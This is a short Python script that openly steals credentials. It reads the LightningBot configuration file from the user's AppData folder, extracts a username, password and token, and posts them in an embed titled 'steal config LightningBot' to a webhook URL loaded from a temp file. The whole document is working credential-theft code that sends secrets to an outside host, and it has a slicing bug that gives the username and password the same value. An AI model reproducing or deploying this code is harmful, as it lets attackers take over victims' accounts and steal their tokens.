import json
import requests
import os

config_path = os.path.expandvars(r'%AppData%\LightningBot\Config\config.json')

webhook_path = os.path.expandvars(r'%temp%\config\webhook.txt')

try:
    with open(webhook_path, 'r') as f:
        webhook_url = f.read().strip()
    
    with open(config_path, 'r', encoding='utf-8') as f:
        lines = [next(f).strip() for _ in range(10)]
    
    ligne_4_mod = lines[3][13:-2]
    ligne_5_mod = lines[3][13:-2]
    ligne_8_mod = lines[7][11:-1]
    
    embed = {
        "embeds": [
            {
                "title": "steal config LightningBot",
                "color": 16711680,
                "fields": [
                    {"name": "Username", "value": ligne_4_mod, "inline": True},
                    {"name": "Password", "value": ligne_5_mod, "inline": True},
                    {"name": "Token", "value": ligne_8_mod, "inline": False}
                ]
            }
        ]
    }
    
    requests.post(webhook_url, json=embed)
except Exception as e:
    print(f"Erreur: {e}")
